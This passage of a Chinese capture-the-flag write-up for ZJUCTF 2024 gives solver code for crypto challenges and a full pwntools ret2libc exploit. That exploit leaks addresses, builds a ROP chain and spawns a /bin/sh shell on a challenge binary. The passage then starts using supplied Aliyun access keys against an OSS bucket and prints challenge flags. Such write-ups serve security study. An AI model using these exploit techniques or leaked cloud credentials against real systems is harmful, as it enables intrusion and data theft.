    <span class="k">if</span> <span class="n">a</span> <span class="o">&lt;</span> <span class="n">b</span><span class="p">:</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&lt;&#39;</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">a</span> <span class="o">&gt;</span> <span class="n">b</span><span class="p">:</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<h2 id="crypto">Crypto<a class="headerlink" href="#crypto" title="Permanent link">&para;</a></h2>
<h3 id="fib-i">FIB Ⅰ<a class="headerlink" href="#fib-i" title="Permanent link">&para;</a></h3>
<p>给了 <span class="arithmatex">\(p, k, (F_a, F_{a+1}), (F_b, F_{b+1})\)</span>，要求：</p>
<ol>
<li><span class="arithmatex">\((F_{a+b}, F_{a+b+1})\)</span></li>
<li><span class="arithmatex">\((F_{k * a}, F_{k * a + 1})\)</span></li>
<li>使得 <span class="arithmatex">\((F_{a + c}, F_{a + c + 1}) = (0, 1)\)</span> 的 <span class="arithmatex">\((F_c, F_{c+1})\)</span></li>
</ol>
<p>使用到的性质为：</p>
<ul>
<li><span class="arithmatex">\(F_{n+k} = F_{k-1} * F_n + F_k * F_{n+1}\)</span></li>
<li><span class="arithmatex">\(F_{2n} = F_n * (F_{n-1} + F_{n+1})\)</span></li>
</ul>
<p>第一问可以直接用性质 1 计算。</p>
<p>第二问用性质 2，类似快速幂，将 <span class="arithmatex">\(k\)</span> 分解为二进制。据说直接算矩阵快速幂也可以，但没想到。</p>
<p>第三问用性质 1，带入进去解方程即可。</p>
<p>代码：</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">math</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">numpy</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">np</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="n">sys</span><span class="o">.</span><span class="n">setrecursionlimit</span><span class="p">(</span><span class="mi">2000</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">fib_plus</span><span class="p">(</span><span class="n">fibn</span> <span class="p">:</span> <span class="nb">tuple</span><span class="p">,</span> <span class="n">fibk</span><span class="p">:</span> <span class="nb">tuple</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">tuple</span><span class="p">:</span>
    <span class="n">Fk</span><span class="p">,</span> <span class="n">Fkp1</span> <span class="o">=</span> <span class="n">fibk</span>
    <span class="n">Fn</span><span class="p">,</span> <span class="n">Fnp1</span> <span class="o">=</span> <span class="n">fibn</span>
    <span class="n">Fks1</span> <span class="o">=</span> <span class="p">(</span><span class="n">Fkp1</span> <span class="o">-</span> <span class="n">Fk</span> <span class="o">+</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
    <span class="n">Fnp2</span> <span class="o">=</span> <span class="p">(</span><span class="n">Fn</span> <span class="o">+</span> <span class="n">Fnp1</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">Fk</span> <span class="o">*</span> <span class="n">Fnp1</span> <span class="o">%</span> <span class="n">p</span> <span class="o">+</span> <span class="n">Fks1</span> <span class="o">*</span> <span class="n">Fn</span> <span class="o">%</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span><span class="p">,</span> <span class="p">(</span><span class="n">Fk</span> <span class="o">*</span> <span class="n">Fnp2</span> <span class="o">%</span> <span class="n">p</span> <span class="o">+</span> <span class="n">Fks1</span> <span class="o">*</span> <span class="n">Fnp1</span> <span class="o">%</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>

<span class="k">def</span><span class="w"> </span><span class="nf">fib_times_k</span><span class="p">(</span><span class="n">k</span> <span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">fib</span> <span class="p">:</span> <span class="nb">tuple</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">tuple</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">k</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span>
    <span class="k">if</span> <span class="n">k</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">fib</span>
    <span class="k">if</span> <span class="n">k</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">fib_plus</span><span class="p">(</span><span class="n">fib</span><span class="p">,</span> <span class="n">fib_times_k</span><span class="p">(</span><span class="n">k</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fib</span><span class="p">))</span>
    <span class="n">fiba</span><span class="p">,</span> <span class="n">fibap1</span> <span class="o">=</span> <span class="n">fib_times_k</span><span class="p">(</span><span class="n">k</span> <span class="o">//</span> <span class="mi">2</span><span class="p">,</span> <span class="n">fib</span><span class="p">)</span>
    <span class="n">fibas1</span> <span class="o">=</span> <span class="p">(</span><span class="n">fibap1</span> <span class="o">-</span> <span class="n">fiba</span> <span class="o">+</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
    <span class="n">fibap2</span> <span class="o">=</span> <span class="p">(</span><span class="n">fiba</span> <span class="o">+</span> <span class="n">fibap1</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
    <span class="n">fib2a</span> <span class="o">=</span> <span class="n">fiba</span> <span class="o">*</span> <span class="p">((</span><span class="n">fibap1</span> <span class="o">+</span> <span class="n">fibas1</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
    <span class="n">fib2ap2</span> <span class="o">=</span> <span class="n">fibap1</span> <span class="o">*</span> <span class="p">((</span><span class="n">fibap2</span> <span class="o">+</span> <span class="n">fiba</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
    <span class="n">fib2ap1</span> <span class="o">=</span> <span class="p">(</span><span class="n">fib2ap2</span> <span class="o">-</span> <span class="n">fib2a</span> <span class="o">+</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
    <span class="k">return</span> <span class="n">fib2a</span><span class="p">,</span> <span class="n">fib2ap1</span>

<span class="k">def</span><span class="w"> </span><span class="nf">fib_calc_c</span><span class="p">(</span><span class="n">fiba</span> <span class="p">:</span> <span class="nb">tuple</span><span class="p">,</span> <span class="n">fibapc</span> <span class="p">:</span> <span class="nb">tuple</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">tuple</span><span class="p">:</span>
    <span class="n">Fa</span><span class="p">,</span> <span class="n">Fap1</span> <span class="o">=</span> <span class="n">fiba</span>
    <span class="n">Fapc</span><span class="p">,</span> <span class="n">Fapcp1</span> <span class="o">=</span> <span class="n">fibapc</span>
    <span class="n">Fas1</span> <span class="o">=</span> <span class="p">(</span><span class="n">Fap1</span> <span class="o">-</span> <span class="n">Fa</span> <span class="o">+</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
    <span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="n">Fap1</span> <span class="o">*</span> <span class="n">Fas1</span> <span class="o">%</span> <span class="n">p</span> <span class="o">+</span> <span class="n">p</span> <span class="o">-</span> <span class="n">Fa</span> <span class="o">*</span> <span class="n">Fa</span> <span class="o">%</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
    <span class="k">if</span> <span class="n">tmp</span> <span class="o">==</span> <span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">Fnp1</span> <span class="o">=</span> <span class="p">(</span><span class="n">Fa</span> <span class="o">*</span> <span class="n">Fapc</span> <span class="o">%</span> <span class="n">p</span> <span class="o">-</span> <span class="n">Fas1</span> <span class="o">*</span> <span class="n">Fapcp1</span> <span class="o">%</span> <span class="n">p</span> <span class="o">+</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
        <span class="n">Fn</span> <span class="o">=</span> <span class="p">(</span><span class="n">Fa</span> <span class="o">*</span> <span class="n">Fapcp1</span> <span class="o">%</span> <span class="n">p</span> <span class="o">-</span> <span class="n">Fapc</span> <span class="o">*</span> <span class="n">Fap1</span> <span class="o">%</span> <span class="n">p</span> <span class="o">+</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
    <span class="k">elif</span> <span class="n">tmp</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">Fnp1</span> <span class="o">=</span> <span class="p">(</span><span class="n">Fas1</span> <span class="o">*</span> <span class="n">Fapcp1</span> <span class="o">%</span> <span class="n">p</span> <span class="o">-</span> <span class="n">Fa</span> <span class="o">*</span> <span class="n">Fapc</span> <span class="o">%</span> <span class="n">p</span> <span class="o">+</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
        <span class="n">Fn</span> <span class="o">=</span> <span class="p">(</span><span class="n">Fapc</span> <span class="o">*</span> <span class="n">Fap1</span> <span class="o">%</span> <span class="n">p</span> <span class="o">-</span> <span class="n">Fa</span> <span class="o">*</span> <span class="n">Fapcp1</span> <span class="o">%</span> <span class="n">p</span> <span class="o">+</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
    <span class="k">return</span> <span class="n">Fn</span><span class="p">,</span> <span class="n">Fnp1</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">61234</span><span class="p">)</span>

<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;p = &#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;k = &#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">k</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;fib(a, p) = &#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">fiba</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;fib(b, p) = &#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">fibb</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;fib(a + b, p) = &#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">fib_plus</span><span class="p">(</span><span class="n">fiba</span><span class="p">,</span> <span class="n">fibb</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">p</span> <span class="o">+</span> <span class="n">res</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;fib(k * a, p) = &#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">fib_times_k</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">fiba</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">p</span> <span class="o">+</span> <span class="n">res</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;if fib(a + c, p) = (0, 1), fib(c, p) = &#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">fib_calc_c</span><span class="p">(</span><span class="n">fiba</span><span class="p">,</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">p</span> <span class="o">+</span> <span class="n">res</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<h3 id="ezxor">ezxor<a class="headerlink" href="#ezxor" title="Permanent link">&para;</a></h3>
<p>给的代码大概是将 flag 转为 01 串，然后做了后缀异或和，然后随机挑选了 20 个 bit 进行翻转。</p>
<p>先不管随机翻转，异或和比较简单，作差分就还原了：</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">random</span>

<span class="c1"># 给定的加密后的二进制字符串</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="s1">&#39;01100011101101011011011000000011101101000101001001000110001111101011000110010100001111111010011110110000010001100011111110110110010110011011010001000111101111100100101110111001110000000101101001001010010111000100100011000111110000000000111001011101111000000100100001001110010011011011100111000000010000011100000001011101101001111011111001011100010111100101000111000000010111011011001001010001110000000100000110111000010010011011000110100011101110011011100010111111101110111010001110110101101101100011111110111110001110111011110001011001101000100101100001001000010011100100101110111010001111111011110110110001101001111010111000110100011011010111001110011001100000101110011110000100010100100110011110111001101101111011011110010101101110000100101000101011101110011100000110010101100110100100011001001000110000101100101001001001101110011001010110100111101101011001010110010001100011000110011001111101100110000111101110010101110111000010100000100011110110000011111001010110&#39;</span>

<span class="c1"># 逆向异或操作</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">cipher</span><span class="p">))):</span>
    <span class="n">tmp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">cipher</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="nb">int</span><span class="p">(</span><span class="n">cipher</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">])</span>
    <span class="n">cipher</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">[:</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span> <span class="o">+</span> <span class="n">cipher</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">:]</span>

<span class="c1"># 逆向 ASCII 编码操作</span>
<span class="n">plain</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">cipher</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
    <span class="n">plain</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">cipher</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="mi">2</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span>
</code></pre></div>
<p>得到 <code>[ÊUCF{Tell_do&gt;e!_Wel£¯me_to_YJUCTF_2&lt;24!}</code>。</p>
<p>题目说 Flag 是一段用下划线代替了空格的有意义的英文句子，其实这时候已经可以看出来了，flag 为 <code>ZJUCTF{Well_done!_Welcome_to_ZJUCTF_2024!}</code>。</p>
<h3 id="shad0wtime">Shad0wTime<a class="headerlink" href="#shad0wtime" title="Permanent link">&para;</a></h3>
<p>非预期做的，不写了。</p>
<h2 id="pwn">Pwn<a class="headerlink" href="#pwn" title="Permanent link">&para;</a></h2>
<p>真难吧</p>
<h3 id="easy-rop">easy rop<a class="headerlink" href="#easy-rop" title="Permanent link">&para;</a></h3>
<p>程序在 <code>read_name</code> 中不断 <code>read(STDIN_FILENO, name, 0x60);</code>，同时 <code>name</code> 数组大小只有 48 字节，存在栈溢出。</p>
<p>checksec 一下，得到：</p>
<div class="highlight"><pre><span></span><code>Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
</code></pre></div>
<p>没有栈保护，可以直接覆盖返回地址。但是开了栈不可执行和 ASLR，推断是 ret2libc。</p>
<p>思路是通过泄漏栈上 read_name 和 main 函数的返回地址，计算 rop 和 libc 的基址，覆盖返回地址调用 <code>system('/bin/sh')</code>。</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pwnlib.util.packing</span><span class="w"> </span><span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">u64</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./rop&#39;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc-2.27.so&quot;</span><span class="p">)</span>
<span class="c1"># io = process(&#39;./rop&#39;)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">61234</span><span class="p">)</span>

<span class="c1"># context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span>
<span class="c1"># pwnlib.gdb.attach(proc.pidof(io)[0], &#39;b read_name&#39;)</span>

<span class="n">libc_offset</span> <span class="o">=</span> <span class="mh">0x0000000000021C87</span>      <span class="c1"># from libc-2.27.so</span>
<span class="n">read_name_offset</span> <span class="o">=</span> <span class="mh">0x00000000000008F5</span> <span class="c1"># from rop</span>

<span class="c1"># get rop base addr</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mh">0x38</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;please: &#39;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">)</span>
<span class="n">recv</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
<span class="n">adr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">recv</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
<span class="n">rop_base_addr</span> <span class="o">=</span> <span class="n">adr</span> <span class="o">-</span> <span class="n">read_name_offset</span>
<span class="n">recv</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;please: &#39;</span><span class="p">)</span>
<span class="c1"># print(recv)</span>

<span class="c1"># get libc base addr</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mh">0x48</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">)</span>
<span class="n">recv</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
<span class="n">adr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">recv</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
<span class="c1"># print(hex(adr))</span>
<span class="n">libc_base_addr</span> <span class="o">=</span> <span class="n">adr</span> <span class="o">-</span> <span class="n">libc_offset</span>
<span class="c1"># print(&quot;libc_base_addr: &quot;, hex(libc_base_addr))</span>
<span class="n">recv</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;please: &#39;</span><span class="p">)</span>
<span class="c1"># print(recv)</span>

<span class="c1"># use `ROPgadget --binary rop --only &quot;pop|ret&quot;` to find pop rdi; ret;</span>
<span class="n">pop_rdi_ret_addr</span> <span class="o">=</span> <span class="mh">0x0000000000000963</span> <span class="o">+</span> <span class="n">rop_base_addr</span>
<span class="n">main</span> <span class="o">=</span> <span class="n">rop_base_addr</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>

<span class="c1"># ret to main</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mh">0x38</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">p_retn</span> <span class="o">=</span> <span class="mh">0x0000000000000666</span> <span class="o">+</span> <span class="n">rop_base_addr</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_retn</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
<span class="c1"># print(hex(main))</span>
<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">recv</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;please: &#39;</span><span class="p">)</span>
<span class="c1"># print(recv)</span>
<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;ZJU</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="c1"># get shell</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mh">0x38</span>
<span class="n">sys_addr</span> <span class="o">=</span> <span class="n">libc_base_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base_addr</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
<span class="c1"># print(hex(sys_addr), hex(bin_sh))</span>
<span class="c1"># print(hex(libc.symbols[&#39;system&#39;]), hex(next(libc.search(b&#39;/bin/sh&#39;))))</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_retn</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;please: &#39;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="c1"># break loop to get shell</span>
<span class="n">recv</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;please: &#39;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;ZJU</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<p>得到 flag <code>ZJUCTF{@n_1a$y_R0p_cHalL_1N_x64|A7hdJk5wN7}</code>。</p>
<h2 id="web">Web<a class="headerlink" href="#web" title="Permanent link">&para;</a></h2>
<p>也好难，只会签到</p>
<h3 id="easy-pentest">easy Pentest<a class="headerlink" href="#easy-pentest" title="Permanent link">&para;</a></h3>
<blockquote>
<p>访问密钥 AccessKey（简称AK）是阿里云提供给用户的永久访问凭据，一组由 AccessKey ID 和 AccessKey Secret 组成的密钥对。</p>
</blockquote>
<p>给了 access key 和 secret key，那直接生成签名就行了。</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">oss2</span>

<span class="c1"># 从 key.txt 文件中读取凭证和目标 URL</span>
<span class="n">access_key_id</span> <span class="o">=</span> <span class="o">...</span>
<span class="n">access_key_secret</span> <span class="o">=</span> <span class="o">...</span>
<span class="n">endpoint</span> <span class="o">=</span> <span class="s1">&#39;https://oss-cn-beijing.aliyuncs.com&#39;</span>
<span class="n">bucket_name</span> <span class="o">=</span> <span class="s1">&#39;oss-test-qazxsw&#39;</span>

<span class="n">auth</span> <span class="o">=</span> <span class="n">oss2</span><span class="o">.</span><span class="n">Auth</span><span class="p">(</span><span class="n">access_key_id</span><span class="p">,</span> <span class="n">access_key_secret</span><span class="p">)</span>
